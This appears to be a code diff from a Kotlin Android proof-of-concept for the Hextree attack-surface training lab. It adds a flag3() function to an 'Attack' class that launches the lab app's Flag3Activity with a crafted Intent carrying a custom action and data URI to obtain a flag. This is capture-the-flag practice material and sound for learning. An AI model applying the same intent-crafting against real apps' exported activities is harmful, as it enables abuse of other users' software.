@@ -2,6 +2,7 @@ package com.vishal2376.hextreepoc
 
 import android.content.Context
 import android.content.Intent
+import androidx.core.net.toUri
 
 /**
  * Author: Vishal Singh (vishal2376)
@@ -26,6 +27,19 @@ class Attack(private val context: Context) {
 		val intent = Intent()
 		intent.setClassName(packageName, activityPath)
 		intent.action = customAction
+		context.startActivity(intent)
+	}
+
+	fun flag3() {
+		val activityPath = "io.hextree.attacksurface.activities.Flag3Activity"
+		val customAction = "io.hextree.action.GIVE_FLAG"
+		val customUri = "https://app.hextree.io/map/android".toUri()
+
+		val intent = Intent()
+		intent.setClassName(packageName, activityPath)
+		intent.action = customAction
+		intent.data = customUri
+
 		context.startActivity(intent)
 	}
 }
